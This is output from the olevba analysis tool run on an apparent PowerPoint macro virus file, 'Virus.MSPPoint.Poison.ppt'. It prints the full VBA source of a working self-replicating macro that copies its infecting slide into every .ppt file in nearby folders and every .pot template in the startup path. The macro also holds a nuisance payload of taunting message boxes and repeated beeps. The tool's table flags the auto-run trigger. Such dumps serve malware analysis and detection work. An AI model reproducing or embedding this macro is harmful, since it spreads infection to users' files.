olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSPPoint.Poison.ppt
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Slide1.cls 
in file: Virus.MSPPoint.Poison.ppt - OLE stream: 'VBA/Slide1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub milenium_Click()
Application.ScreenUpdating = False
hpath = ActivePresentation.FullName
With Application.FileSearch
.NewSearch
.LookIn = ActivePresentation.Path
.SearchSubFolders = True
.FileName = "*.ppt"
End With
For cq = 1 To Application.FileSearch.FoundFiles.Count
Set futureh = Presentations.Open(Application.FileSearch.FoundFiles(cq))
If futureh.Slides(1).Name <> "DarkPoison" Then
futureh.Slides.InsertFromFile hpath, 1, 1, -1
futureh.Save
End If
futureh.Close
Next cq
With Application.FileSearch
.NewSearch
.LookIn = Application.StartupPath
.SearchSubFolders = True
.FileName = "*.pot"
End With
For cq = 1 To Application.FileSearch.FoundFiles.Count
Set futureh = Presentations.Open(Application.FileSearch.FoundFiles(cq))
If futureh.Slides(1).Name <> "DarkPoison" Then
futureh.Slides.InsertFromFile hpath, 1, 1, -1
futureh.Save
End If
futureh.Close
Next cq
Application.ScreenUpdating = False
If Minute(Now) = Int(60 * Rnd) Then
MsgBox "Every time that AntiVirus companies detects a virus," & vbCr & "we(the VX xcene) come up with a new infection tech.", vbCritical, "Yozak in the new MILENIUM"
MsgBox "Our scene is too active for you!" & vbCr & "So lamers get the hell out of here" & vbCr & "You make me sick", vbOKOnly, "Yozak in the new MILENIUM"
For v = 1 To Int(5000 * Rnd)
Beep
MsgBox "Lamers BEWARE !!", vbApplicationModal, "Yozak in the new melium"
Next v
MsgBox "YOZAC enters the new milenium with a DARKPOISoN!!!!", vbMsgBoxSetForeground, "DARKPOISoN"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |milenium_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

